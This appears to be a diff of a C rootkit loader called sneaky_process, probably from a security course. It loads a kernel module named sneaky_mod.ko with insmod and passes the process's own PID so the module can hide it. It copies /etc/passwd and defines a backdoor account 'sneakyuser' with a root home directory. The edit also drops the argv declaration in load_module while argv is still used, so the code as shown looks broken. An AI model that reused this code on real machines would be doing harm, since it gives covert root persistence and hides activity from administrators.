@@ -9,6 +9,7 @@
 char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
 char * src = "/etc/passwd";
 char * destination = "/tmp/passwd";
+pid_t process_id;
 
 
 
@@ -21,8 +22,8 @@ void unload_module(){
     exit(EXIT_FAILURE);
   }
   else if( unload_pid == 0){
-    ;
-    char * argv[2] = {"sneaky_mod.ko", NULL};
+  
+     char * argv[3] =  {"rmmod","sneaky_mod.ko", NULL};
      if(execvp("rmmod", argv) < 0){
       perror( "execution error the module un-loading process");
       exit(EXIT_FAILURE);
@@ -49,7 +50,8 @@ void unload_module(){
 
 void load_module(){
 
-  pid_t parent_process = getppid();
+  //pid_t parent_process = getppid();
+  pid_t parent_process = process_id;
   pid_t load_pid = fork();
   
   
@@ -60,8 +62,7 @@ void load_module(){
   else if( load_pid == 0){
 
     char module_arg[50];
-    sprintf(module_arg, "parent_id = %d\n", parent_process);
-    char * argv[3] = {"sneaky_mod.ko", module_arg, NULL};
+    snprintf(module_arg, sizeof(module_arg),"parent_id = %d\n", parent_process);
     
     if(execvp("insmod", argv) < 0){
       perror( "execution error the module loading process");
@@ -150,8 +151,8 @@ void loop(){
 int main(){
 
   //Print process PID
-  pid_t pid = getpid();
-  printf("sneaky_process pid = %d\n", pid);
+  process_id = getpid();
+  printf("sneaky_process pid = %d\n", process_id);
 
   //First malicious act. Copy /etc/passwd file to a new file: /tmp/passwd
   copy_file(src, destination);
